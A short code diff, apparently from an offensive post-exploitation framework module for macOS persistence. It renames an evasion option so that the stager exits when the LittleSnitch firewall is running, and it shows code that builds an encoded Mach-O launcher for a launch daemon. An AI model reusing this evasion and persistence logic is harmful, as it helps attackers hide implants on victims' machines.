@@ -45,8 +45,8 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'SafeChecks' : {
-                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+            'LittleSnitch' : {
+                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
                 'Required'      :   True,
                 'Value'         :   'True'
             },
@@ -89,8 +89,8 @@ class Module:
         plistfilename = "%s.plist" % daemonName
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
-        SafeChecks = self.options['SafeChecks']['Value']
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, safechecks=SafeChecks)
+        LittleSnitch = self.options['LittleSnitch']['Value']
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, littlesnitch=LittleSnitch)
         launcher = launcher.strip('echo').strip(' | python &').strip("\"")
         machoBytes = self.mainMenu.stagers.generate_macho(launcherCode=launcher)
         encBytes = base64.b64encode(machoBytes)
